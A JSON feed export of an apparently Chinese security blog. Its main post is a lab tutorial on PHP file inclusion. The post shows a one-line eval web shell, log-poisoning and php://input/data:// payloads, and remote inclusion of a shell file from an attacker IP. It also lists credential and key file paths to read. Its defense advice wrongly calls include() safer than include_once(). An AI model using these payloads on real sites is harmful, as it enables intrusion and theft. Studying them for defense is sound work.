{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg • All posts by \"基础漏洞\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "url": "http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "title": "文件包含漏洞",
            "date_published": "2023-10-30T14:15:36.000Z",
            "content_html": "<p><strong>文件包含漏洞（File Inclusion Vulnerability）是一种常见的网络安全漏洞，通常发生在 web 应用程序中。这种漏洞允许攻击者在应用程序中包含、执行或显示本不应该被访问的文件内容。文件包含漏洞通常发生在以下两种情况中：</strong></p>\n<ol>\n<li><strong>本地文件包含（Local File Inclusion，LFI）：攻击者通过构造恶意请求，使应用程序包含本地文件系统上的文件，通常是敏感文件。这些文件可以包括密码文件、配置文件、日志文件等，泄露敏感信息或执行恶意代码。攻击者通常通过修改 URL 参数或请求头来实施这种攻击。</strong></li>\n<li><strong>远程文件包含（Remote File Inclusion，RFI）：攻击者利用应用程序允许包含远程文件的漏洞，将恶意代码包含到应用程序中，以执行攻击者控制的代码。通常，攻击者提供一个远程 URL，应用程序会下载并执行其中的内容。</strong></li>\n<li><strong>输入验证和过滤：确保应用程序对用户提供的文件路径或 URL 进行适当的输入验证和过滤，以防止包含恶意文件或路径。</strong></li>\n<li><strong>使用白名单：仅允许应用程序包含已知可信的文件或路径，而不是黑名单，因为黑名单可能不完全，无法覆盖所有潜在的攻击。</strong></li>\n<li><strong>隔离文件系统权限：确保应用程序运行在具有最小权限的帐户上，以减少攻击者获取访问文件系统的机会。</strong></li>\n<li><strong>定期更新和维护应用程序：确保应用程序和相关组件都是最新的，以修复已知的漏洞。</strong></li>\n<li><strong>安全编程实践：开发人员应当采用安全编程实践，避免将用户提供的输入直接用于文件包含操作，尤其是未经适当验证和过滤的输入。</strong></li>\n<li><strong>使用 Web 应用程序防火墙（WAF）：WAF 可以帮助检测和阻止文件包含漏洞等攻击。</strong></li>\n</ol>\n<h3 id=\"常见文件包含函数\"><a class=\"markdownIt-Anchor\" href=\"#常见文件包含函数\">#</a> <strong>常见文件包含函数</strong></h3>\n<ul>\n<li><strong>PHP</strong>**：**</li>\n<li><strong>include ()****: 用于将文件包含到 PHP 脚本中。如果包含的文件不存在，它会产生警告，但脚本会继续执行。</strong></li>\n<li>**require()<strong><strong>: 与</strong></strong> include ()**<strong> 类似，但如果包含的文件不存在，它会产生致命错误，停止脚本执行。</strong></li>\n<li><strong>include_once ()****: 用于包含文件，但只包含一次，以防止重复包含。</strong></li>\n<li>**require_once()<strong><strong>: 与</strong></strong> include_once ()**<strong> 类似，但只包含一次，并且如果文件不存在会产生致命错误。</strong></li>\n<li><strong>Python</strong>**：**</li>\n<li><strong>execfile ()****: 用于执行 Python 文件。可以将外部文件的代码动态执行在当前环境中。</strong></li>\n<li><strong>import: 用于导入其他 Python 模块。这通常更安全，因为 Python 的导入系统有内置的安全性。</strong></li>\n</ul>\n<h3 id=\"代码分析\"><a class=\"markdownIt-Anchor\" href=\"#代码分析\">#</a> 代码分析</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$html</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"include/<span class=\"token interpolation\"><span class=\"token variable\">$filename</span></span>\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 变量传进来直接包含，没做任何的安全限制</span></pre></td></tr></table></figure><ul>\n<li><strong>因为它未正确过滤和验证来自客户端的输入数据，而是直接使用了 include 函数包含了客户端传递的文件。所以导致漏洞</strong></li>\n</ul>\n<p><strong>安全写法</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>安全的写法<span class=\"token punctuation\">,</span>使用白名单，严格指定包含的文件名</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'file1.php'</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'file2.php'</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'file3.php'</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'file4.php'</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'file5.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"include/<span class=\"token interpolation\"><span class=\"token variable\">$filename</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"文件包含漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#文件包含漏洞利用\">#</a> 文件包含漏洞利用</h3>\n<ul>\n<li>\n<p><strong>本地文件包含 - 包含本地的文件</strong></p>\n</li>\n<li>\n<p><strong>本地有一个 shell 文件内容是<?php phpinfo();eval($_POST['cmd']);?></strong></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/image.png\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>传入参数去包含 shell,…/ 是表示上目录，查找有没有这个文件如果有的话就包含这个文件执行里面的</strong></p>\n</li>\n<li>\n<p><strong>php 代码如果是不可执行的话返回内容</strong></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/3.png\" alt=\"\"></p>\n<ul>\n<li><strong>配合图片马使用也是可以包含执行的</strong></li>\n<li><strong>上传图片马然后用蚂蚁剑连接</strong></li>\n</ul>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/4.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/5.png\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"包含日志文件进行getshell\"><a class=\"markdownIt-Anchor\" href=\"#包含日志文件进行getshell\">#</a> <strong>包含日志文件进行 getshell</strong></h3>\n<p><strong>常见的中间件和服务器日志文件的默认路径可以因软件版本、操作系统和配置而异，但通常以下是一些常见的默认日志文件路径：</strong></p>\n<ol>\n<li><strong>Apache HTTP Server</strong>**😗*</li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>错误日志文件:</strong> <strong>/var/log/apache2/error.log</strong> <strong>(Debian/Ubuntu) 或</strong> <strong>/var/log/httpd/error_log</strong> <strong>(CentOS/RHEL)</strong></li>\n<li><strong>访问日志文件:</strong> <strong>/var/log/apache2/access.log</strong> <strong>(Debian/Ubuntu) 或</strong> <strong>/var/log/httpd/access_log</strong> <strong>(CentOS/RHEL)</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>Nginx</strong>**😗*</li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>错误日志文件:</strong> <strong>/var/log/nginx/error.log</strong></li>\n<li><strong>访问日志文件: /var/log/nginx/access.log</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>Tomcat</strong>**😗*</li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>错误日志文件:</strong> <strong>$CATALINA_BASE/logs/catalina.out</strong>**（通常在<strong><strong> catalina.out</strong></strong> 或<strong><strong> catalina.log</strong></strong> 文件中）**</li>\n<li><strong>访问日志文件: $CATALINA_BASE/logs/access_log</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>错误日志：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>默认情况下，IIS 的错误日志通常位于</strong> *<em>%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC#*</em> <strong>目录中，其中</strong> <strong>#</strong> <strong>代表站点的唯一 ID。通常，这个目录中会有多个子目录，每个子目录对应一个不同的站点。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>访问日志</strong> **：**</li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>访问日志通常也存储在与错误日志相同的目录中，即 % SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC#。这里的 # 仍然代表站点的唯一 ID。通常，访问日志文件以 u_exYYMMDD.log 格式的方式命名，其中 YYMMDD 代表日期。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>用 burp 抓包然后把提交的参数写成一句话木马<?php phpinfo();eval($_POST['cmd']);?></strong></li>\n<li><strong>然后 apache 服务器日志里会有这样的记录 127.0.0.1 - - [30/Oct/2023:17:51:19 +0800] “GET /vul/fileinclude/fi_local.php?filename=<?php phpinfo();eval($_POST['cmd']);?>&amp;submit=% E6%8F%90% E4% BA% A4% E6%9F% A5% E8% AF% A2” 400 2220 里会有我们刚才提交的一句话木马，然后用文件包含去包含</strong></li>\n<li><strong>这个日志文件里面的一句话就会被执行错误日志也可以（前提是要有权限）</strong></li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/7.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/8.png\" alt=\"\"></p>\n<h3 id=\"配合文件上传漏洞getshell\"><a class=\"markdownIt-Anchor\" href=\"#配合文件上传漏洞getshell\">#</a> 配合文件上传漏洞 getshell</h3>\n<p><strong>文件上传一个 txt 文本或者图片里面添加一句话木马</strong></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/10.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/11.png\" alt=\"\"></p>\n<h3 id=\"伪协议\"><a class=\"markdownIt-Anchor\" href=\"#伪协议\">#</a> 伪协议</h3>\n<ol>\n<li><strong>file://:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于访问本地文件系统中的文件。在文件包含漏洞攻击中，攻击者可能尝试使用这个协议来包含恶意文件。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>http://</strong> <strong>和</strong> <strong>https://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于访问 HTTP 和 HTTPS URL 资源。这些协议通常用于从 Web 服务器上获取数据。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>ftp://</strong> <strong>和</strong> <strong>ftps://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于访问 FTP 和 FTPS URLs，可以用于上传和下载文件。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>php://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于访问各种输入 / 输出流，如<strong><strong> php://input</strong></strong> 和<strong><strong> php://output</strong></strong>，在 PHP 中执行文件操作时非常有用。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>zlib://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于压缩和解压缩流。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>data://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于处理数据 URL，允许将数据直接嵌入到 URL 中。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>glob://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于查找匹配的文件路径模式，通常用于文件操作。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>phar://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于处理 PHP 归档文件，通常用于包含 PHP 库和资源。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>ssh2://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于 SSH2 协议，可用于安全的 Shell 访问和文件传输。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>rar://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于处理 RAR 文件。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>ogg://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于处理音频流，特别是 Ogg Vorbis 音频文件。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>expect://****:</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>用于处理交互式流，通常用于自动化脚本。</strong></li>\n</ul>\n</li>\n<li></li>\n<li>\n<h3 id=\"phpini设置\"><a class=\"markdownIt-Anchor\" href=\"#phpini设置\">#</a> php.ini 设置</h3>\n</li>\n<li>\n<p><strong>allow_url_fopen 和 allow_url_include 是 PHP 配置选项，用于控制是否允许在代码中访问远程资源和包含远程文件。这两个选项与安全性有关，因为它们可以影响应用程序的安全性。下面分别介绍这两个选项：</strong></p>\n</li>\n<li>\n<ol>\n<li><strong>allow_url_fopen</strong>**😗*</li>\n</ol>\n</li>\n<li>\n<ul>\n<li>\n<ul>\n<li><strong>allow_url_fopen</strong> <strong>是一个 PHP 配置选项，用于控制是否允许通过 ****fopen ()</strong> <strong>函数或其他文件处理函数来访问远程资源。如果这个选项被启用（设置为</strong> <strong>1</strong>**），PHP 允许在代码中使用类似 ** <strong>fopen(“<a href=\"http://example.com/resource\">http://example.com/resource</a>”, “r”)</strong> <strong>的方式打开远程 URL，并读取它们的内容。如果禁用（设置为</strong> <strong>0</strong>**），PHP 将不允许这样的操作。**</li>\n<li><strong>需要小心，因为启用</strong> <strong>allow_url_fopen</strong> <strong>可能会导致安全风险，特别是在处理用户提供的 URL 时。攻击者可能尝试包含恶意远程文件或执行恶意代码，从而引发安全问题。</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<ol>\n<li><strong>allow_url_include</strong>**😗*</li>\n</ol>\n</li>\n<li>\n<ul>\n<li>\n<ul>\n<li><strong>allow_url_include</strong> <strong>是另一个 PHP 配置选项，它控制是否允许通过 ****include</strong> <strong>和</strong> <strong>require</strong> <strong>函数包含远程文件，如</strong> <strong>include “<a href=\"http://example.com/malicious.php\">http://example.com/malicious.php</a>”;****。如果启用（设置为</strong> <strong>1</strong>**），PHP 允许包含远程文件。如果禁用（设置为 ** <strong>0</strong>**），PHP 将不允许包含远程文件。**</li>\n<li><strong>启用 allow_url_include 可能会引发安全风险，因为攻击者可以尝试包含远程恶意代码。</strong></li>\n</ul>\n</li>\n<li>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/12.png\" alt=\"\"></p>\n</li>\n<li></li>\n<li>\n<h3 id=\"协议用法\"><a class=\"markdownIt-Anchor\" href=\"#协议用法\">#</a> 协议用法</h3>\n</li>\n<li>\n<h4 id=\"phpinput\"><a class=\"markdownIt-Anchor\" href=\"#phpinput\">#</a> php://input</h4>\n</li>\n<li>\n<ol>\n<li><strong>php.ini 条件是 allow_url_fopen =ON allow_url_include=ON</strong></li>\n<li><strong>遇到 file_get_contents () 要想到用 php://input 绕过</strong></li>\n<li><strong>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input, 同时 post 想设置的文件内容，php 执行时会将 post 内容当作文件内容。从而导致任意代码执行。</strong></li>\n<li><strong>比如写<?php phpinfo();?> 或者写一句话？file=php://input POST: 需要写入的数据</strong></li>\n<li><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/13.png\" alt=\"\"></li>\n</ol>\n</li>\n<li>\n<h4 id=\"phpfile\"><a class=\"markdownIt-Anchor\" href=\"#phpfile\">#</a> php://file</h4>\n</li>\n<li>\n<ol>\n<li><strong>用它来本地包含读取本地敏感文件比如 file:///etc/passwd</strong></li>\n<li><strong>读取相对路径 php?file=…/…/php.ini</strong></li>\n</ol>\n</li>\n<li>\n<h4 id=\"phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#phpfilter\">#</a> php://filter</h4>\n</li>\n<li>\n<ol>\n<li><strong>php://filter/convert.base64-encode/resource = 文件路径 base64 读取读取后 base 解码得到源码</strong></li>\n<li><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/14.png\" alt=\"\"></li>\n<li><strong>解码得到 admin password</strong></li>\n</ol>\n</li>\n<li>\n<h4 id=\"zip\"><a class=\"markdownIt-Anchor\" href=\"#zip\">#</a> zip://</h4>\n</li>\n<li>\n<ol>\n<li><strong>用于访问对应的压缩文件子文件但是要绝对路径 zip 文件跟子文件要用# %23 分割， 只需要是 zip 的压缩包即可，后缀名可以任意更改</strong></li>\n<li><strong>相同的类型还有 zlib:// 和 bzip2://</strong></li>\n<li><strong>利用 page=zip://D:\\Everydaytools\\phpstudy_pro\\WWW\\www.dvwa.com\\vulnerabilities\\123.zip%23123.txt</strong></li>\n<li><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/15.png\" alt=\"\"></li>\n<li><strong>得到 123.zip 里面的 123.txt</strong></li>\n</ol>\n</li>\n<li>\n<h4 id=\"data协议\"><a class=\"markdownIt-Anchor\" href=\"#data协议\">#</a> data:// 协议</h4>\n</li>\n<li>\n<ol>\n<li><strong>类似与 php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data:// 流会被当作 php 文件执行。从而导致任意代码执行。</strong></li>\n<li><strong>?page=data://text/plain,<?php phpinfo();?>或者用 baes64 编码后？page=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+</strong></li>\n<li><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/16.png\" alt=\"\"></li>\n</ol>\n</li>\n<li></li>\n<li></li>\n<li>\n<h3 id=\"文件包含常用路径\"><a class=\"markdownIt-Anchor\" href=\"#文件包含常用路径\">#</a> 文件包含常用路径</h3>\n</li>\n<li>\n<h4 id=\"日志文件\"><a class=\"markdownIt-Anchor\" href=\"#日志文件\">#</a> 日志文件</h4>\n</li>\n<li>\n<ol>\n<li><strong>/usr/local/apache2/logs/access_log</strong></li>\n<li><strong>/logs/access_log</strong></li>\n<li><strong>/etc/httpd/logs/access_log</strong></li>\n<li><strong>/var/log/httpd/access_log</strong></li>\n<li><strong>/var/log/nginx/access.log</strong></li>\n<li><strong>/var/log/nginx/error.log</strong></li>\n<li><strong>$CATALINA_BASE/logs/access_log</strong></li>\n<li><strong>$CATALINA_BASE/logs/catalina.out</strong></li>\n</ol>\n</li>\n<li>\n<h4 id=\"网站配置文件\"><a class=\"markdownIt-Anchor\" href=\"#网站配置文件\">#</a> 网站配置文件</h4>\n</li>\n<li>\n<ol>\n<li><strong>dedecms-- data/common.inc.php,</strong></li>\n<li><strong>discuz 全–config/config_global.php,</strong></li>\n<li><strong>phpcms–caches/configs/database.php</strong></li>\n<li><strong>phpwind- -conf/database.php</strong></li>\n<li><strong>wordpress-- wp-config.php</strong></li>\n</ol>\n</li>\n<li>\n<h4 id=\"系统配置文件\"><a class=\"markdownIt-Anchor\" href=\"#系统配置文件\">#</a> 系统配置文件</h4>\n</li>\n<li>\n<p><strong>linux</strong></p>\n</li>\n<li>\n<p><strong>/root/.ssh/authorized_keys</strong></p>\n</li>\n<li>\n<p><strong>/root/.ssh/id_rsa</strong></p>\n</li>\n<li>\n<p><strong>/root/.ssh/id_ras.keystore</strong></p>\n</li>\n<li>\n<p><strong>/root/.ssh/known_hosts</strong></p>\n</li>\n<li>\n<p><strong>/etc/passwd</strong></p>\n</li>\n<li>\n<p><strong>/etc/shadow</strong></p>\n</li>\n<li>\n<p><strong>/etc/my.cnf</strong></p>\n</li>\n<li>\n<p><strong>/etc/httpd/conf/httpd.conf</strong></p>\n</li>\n<li>\n<p><strong>/root/.bash_history</strong></p>\n</li>\n<li>\n<p><strong>/root/.mysql_history</strong></p>\n</li>\n<li>\n<p><strong>/proc/self/fd/fd [0-9]*(文件标识符)</strong></p>\n</li>\n<li>\n<p><strong>/proc/mounts</strong></p>\n</li>\n<li>\n<p><strong>/porc/config.gz</strong></p>\n</li>\n<li>\n<p><strong>win</strong></p>\n</li>\n<li>\n<p><strong>C:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置</strong></p>\n</li>\n<li>\n<p><strong>C:/Windows/repairsam// 初次安装的密码</strong></p>\n</li>\n<li>\n<p><strong>C:/Program Files/mysql/my.ini//Mysql 配置</strong></p>\n</li>\n<li>\n<p><strong>C:/Program Files/mysql/data/mysql/user.MYD//Mysql root</strong></p>\n</li>\n<li>\n<p><strong>C:/Windows/php.ini//php 配置</strong></p>\n</li>\n<li>\n<p><strong>C:/Windows/my.ini//Mysql 配置</strong></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"远程文件包含\"><a class=\"markdownIt-Anchor\" href=\"#远程文件包含\">#</a> <strong>远程文件包含</strong></h3>\n<ol>\n<li><strong>当远程文件开启时，可以包含远程文件到本地执行。当 allow_url_fopen=On allow_url_include=ON 两个条件同时为 On 允许远程包含文件。</strong></li>\n<li><a href=\"http://192.168.0.103/lfi.php?file=http://192.168.0.103/shell.txt\"><strong>http://192.168.0.103/lfi.php?file=http://xxx.xxx.xxx.xxx/shell.txt</strong></a> <strong>xxx.xxx.xxx.xxx 设置为远程的 ip</strong></li>\n</ol>\n<h3 id=\"文件包含截断\"><a class=\"markdownIt-Anchor\" href=\"#文件包含截断\">#</a> 文件包含截断</h3>\n<h4 id=\"00截断\"><a class=\"markdownIt-Anchor\" href=\"#00截断\">#</a> %00 截断</h4>\n<ol>\n<li><strong>php 版本要低于 5.3.4 使用 include 等文件包含函数，可以截断文件名，但是会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成 \\0 截断会失败。</strong></li>\n</ol>\n<h4 id=\"超长文件包含截断\"><a class=\"markdownIt-Anchor\" href=\"#超长文件包含截断\">#</a> 超长文件包含截断</h4>\n<ol>\n<li><strong>合适于 win32 可以使用。进行截断 和 .(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256) 利用操作系统对目录最大长度限制。在 window 下 256 字节 linux 下 4096 字节</strong></li>\n</ol>\n<h4 id=\"点截断\"><a class=\"markdownIt-Anchor\" href=\"#点截断\">#</a> 点截断</h4>\n<ol>\n<li><strong>php?file=x.jpg…</strong></li>\n</ol>\n<h4 id=\"截断\"><a class=\"markdownIt-Anchor\" href=\"#截断\">#</a> /. 截断</h4>\n<ol>\n<li><strong>php?file=shell.png%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2 e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e</strong></li>\n</ol>\n<h4 id=\"远程包含截断\"><a class=\"markdownIt-Anchor\" href=\"#远程包含截断\">#</a> 远程包含截断</h4>\n<ol>\n<li><strong>?url=%3f</strong></li>\n<li><strong>00url=%00</strong></li>\n<li><strong>#url=%23</strong></li>\n</ol>\n<h3 id=\"防御\"><a class=\"markdownIt-Anchor\" href=\"#防御\">#</a> 防御</h3>\n<ol>\n<li><strong>输入验证和过滤：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>对用户提供的输入进行验证和过滤，确保用户输入不包含恶意数据。</strong></li>\n<li><strong>使用白名单控制，只允许应用程序需要的文件和目录被包含。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>使用白名单控制：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>确保只有可信的文件和目录被包含。不要从用户提供的数据中构建文件路径。</strong></li>\n<li><strong>限制包含文件的目录，只允许访问应用程序需要的文件和目录。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>避免直接用户输入：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>不要直接将用户输入用作包含文件的路径。如果必须使用用户提供的输入，确保对其进行严格的过滤和验证。</strong></li>\n<li><strong>使用安全的文件包含函数，如<strong><strong> include ()<strong><strong> 和</strong></strong> require ()</strong></strong>，而不是不安全的函数，如<strong><strong> include_once ()<strong><strong> 和</strong></strong> require_once ()</strong></strong>。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>文件权限：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>设置适当的文件和目录权限，以确保只有授权的用户可以访问和执行文件。</strong></li>\n<li><strong>避免将敏感文件放在 Web 根目录下，以减少可能的攻击面。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>配置安全：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>配置 Web 服务器和应用程序框架以最小化攻击面。</strong></li>\n<li><strong>禁用不必要的文件包含功能，如<strong><strong> allow_url_fopen</strong></strong> 和<strong><strong> allow_url_include</strong></strong>，以防止包含远程文件。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>监控和日志：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>实施监控和日志功能，以及时检测和响应潜在的文件包含攻击。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>安全开发实践：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>培训开发人员，使他们了解文件包含漏洞和其他常见 Web 应用程序漏洞。</strong></li>\n<li><strong>使用安全编程技术，如输出编码和防止 SQL 注入，以加强应用程序的整体安全性。</strong></li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><strong>安全扫描：</strong></li>\n</ol>\n<ul>\n<li>\n<ul>\n<li><strong>定期进行安全扫描和渗透测试，以识别和修复文件包含漏洞以及其他潜在的漏洞。</strong></li>\n</ul>\n</li>\n</ul>\n<p><strong>综上所述，文件包含漏洞的防御需要综合使用多种方法，包括输入验证、白名单控制、文件权限管理、安全配置和教育开发人员等措施。这些措施有助于降低文件包含漏洞对应用程序的风险。</strong></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "title": "sql注入",
            "date_published": "2023-10-28T11:09:44.000Z",
